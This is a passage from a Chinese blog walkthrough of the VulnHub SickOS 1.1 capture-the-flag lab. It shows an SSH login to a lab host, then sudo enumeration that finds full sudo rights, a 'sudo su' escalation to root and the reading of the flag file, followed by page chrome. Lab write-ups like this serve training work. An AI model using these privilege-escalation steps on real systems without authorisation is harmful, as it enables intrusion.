+</span></span><span class="line"><span class="cl">This key is not known by any other names.
+</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;192.168.152.135&#39; (ECDSA) to the list of known hosts.
+</span></span><span class="line"><span class="cl">sickos@192.168.152.135&#39;s password: 
+</span></span><span class="line"><span class="cl">Permission denied, please try again.
+</span></span><span class="line"><span class="cl">sickos@192.168.152.135&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Wed Mar 20 15:30:12 IST 2024
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:           116
+</span></span><span class="line"><span class="cl">  Usage of /:   4.3% of 28.42GB   Users logged in:     0
+</span></span><span class="line"><span class="cl">  Memory usage: 12%               IP address for eth0: 192.168.152.135
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Graph this data and manage this system at:
+</span></span><span class="line"><span class="cl">    https://landscape.canonical.com/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">124 packages can be updated.
+</span></span><span class="line"><span class="cl">92 updates are security updates.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">New release &#39;14.04.3 LTS&#39; available.
+</span></span><span class="line"><span class="cl">Run &#39;do-release-upgrade&#39; to upgrade to it.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Tue Sep 22 08:32:44 2015
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="linux提权">Linux提权</h2>
+<p>查看当前权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sickos@SickOs:~$ sudo -l
+</span></span><span class="line"><span class="cl">[sudo] password for sickos: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries for sickos on this host:
+</span></span><span class="line"><span class="cl">    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User sickos may run the following commands on this host:
+</span></span><span class="line"><span class="cl">    (ALL : ALL) ALL
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>很明显直接sudo su即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
+</span></span><span class="line"><span class="cl">^BIf you are viewing this!!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ROOT!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You have Succesfully completed SickOS1.1.
+</span></span><span class="line"><span class="cl">Thanks for Trying
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+</section>
+
+      
+        
+<div class="comments">
+  <script>
+      const getTheme = window.localStorage && window.localStorage.getItem("theme");
+      let theme = getTheme === 'dark' ? 'dark' : 'light';
+      let s = document.createElement('script');
+      s.src = 'https://giscus.app/client.js';
+      s.setAttribute('data-repo', 'Wh1teJ0ker\/discussion');
+      s.setAttribute('data-repo-id', 'R_kgDOOTzcZA');
+      s.setAttribute('data-category', 'Announcements');
+      s.setAttribute('data-category-id', 'DIC_kwDOOTzcZM4CoxXV');
+      s.setAttribute('data-mapping', 'pathname');
+      s.setAttribute('data-strict', '0');
+      s.setAttribute('data-reactions-enabled', '1');
+      s.setAttribute('data-emit-metadata', '0');
+      s.setAttribute('data-input-position', 'top');
+      s.setAttribute('data-theme', theme);
+      s.setAttribute('data-lang', 'zh-CN');
+      s.setAttribute('data-loading', 'lazy');
+      s.setAttribute('crossorigin', 'anonymous');
+      s.setAttribute('async', '');
+      document.querySelector('div.comments').innerHTML = '';
+      document.querySelector('div.comments').appendChild(s);
+  </script>
+</div>
+
+      
+
+      
+      
+      <div class="paginator">
+        
+        <a class="prev" href="https://wh1tej0ker.github.io/post/greatwall-z1cku96.html">
+          <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+          </svg>
+          <span>春秋云境-GreatWall</span></a>
+        
+        
+        <a class="next" href="https://wh1tej0ker.github.io/post/vulnhubgreas-1q5woh.html"><span>VulnHub-Jarbas</span>
+          <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+          </svg>
+        </a>
+        
+      </div>
+      
+
+      
+
+
+    </div>
+  </div>
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2026 <a href="https://wh1tej0ker.github.io/">Wh1teJ0kerのBlog</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+</a>
+
+
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
+
+        function copyingDone() {
+            copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-check"><polyline points="20 6 9 17 4 12"></polyline></svg>';
+            setTimeout(() => {
+                copybutton.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-copy"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+      
+      
+      <div id="search-modal" class="search-modal" style="display: none;">
+          <div class="search-modal-content">
+              <div class="search-input-wrapper">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                  <input type="text" id="search-input" placeholder="搜索标题、标签或正文关键字" autocomplete="off">
+                  <button type="button" id="search-clear" class="search-clear" aria-label="清除搜索">
+                      ×
+                  </button>
+                  <span class="search-shortcut">ESC</span>
+              </div>
+              <div id="search-results" class="search-results"></div>
+          </div>
+      </div>
+
+      <style>
+        #search-modal {
+          position: fixed;
+          inset: 0;
+          z-index: 2000;
+          display: none;
+          background-color: rgba(15, 23, 42, 0.6);
+          backdrop-filter: blur(14px);
+          -webkit-backdrop-filter: blur(14px);
+          align-items: center;
+          justify-content: center;
+          padding: 0 1.5rem;
+        }
+
+        #search-modal.active {
+          display: flex;
+        }
+
+        #search-modal .search-modal-content {
+          width: 100%;
+          max-width: 880px;
+          max-height: 80vh;
+          margin: 0;
+          background: transparent;
+          box-shadow: none;
+          border-radius: 0;
+          display: flex;
+          flex-direction: column;
+        }
+
+        [data-dark-mode] #search-modal .search-modal-content {
+          background: transparent;
+          border: none;
+        }
+      </style>
+    </body><script src="https://cdn.jsdelivr.net/npm/fuse.js@6.6.2"></script>
+
+<script src="/main.min.80d50982893555370f4aacc2affcf405ae67515c8053bb96ae4aa69934f4efec7c58bde5638ac91af85238507fcc283a42df3e061b5b83554fd71d3c87979053.js" integrity="sha512-gNUJgok1VTcPSqzCr/z0Ba5nUVyAU7uWrkqmmTT07&#43;x8WL3lY4rJGvhSOFB/zCg6Qt8&#43;Bhtbg1VP1x08h5eQUw==" crossorigin="anonymous" defer></script></html>
